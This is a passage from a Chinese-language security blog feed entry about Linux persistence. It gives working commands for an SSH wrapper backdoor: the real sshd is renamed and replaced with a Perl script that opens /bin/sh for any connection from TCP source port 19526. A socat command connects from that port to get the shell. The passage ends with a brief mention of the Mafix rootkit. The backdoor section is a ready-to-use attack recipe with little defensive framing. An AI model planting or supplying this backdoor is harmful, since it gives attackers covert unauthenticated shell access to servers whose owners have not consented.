<h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。</p>
<h3 id="目标端"><a href="#目标端" class="headerlink" title="目标端"></a>目标端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cd /usr/sbin</div><div class="line">mv sshd ../bin</div><div class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</div><div class="line">echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</div><div class="line">echo &apos;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</div><div class="line">chmod u+x sshd</div><div class="line">/etc/init.d/sshd restart</div></pre></td></tr></table></figure>
<h3 id="控制端"><a href="#控制端" class="headerlink" title="控制端"></a>控制端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat STDIOTCP4:target_ip:22,sourceport=19526</div></pre></td></tr></table></figure>
<h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><h3 id="Mafix"><a href="#Mafix" class="headerlink" title="Mafix"></a>Mafix</h3><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录之前所写的东西，这篇找不到原来的发布时间了。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Linux" scheme="http://rcoil.me/tags/Linux/"/>
    
  </entry>
  
</feed>
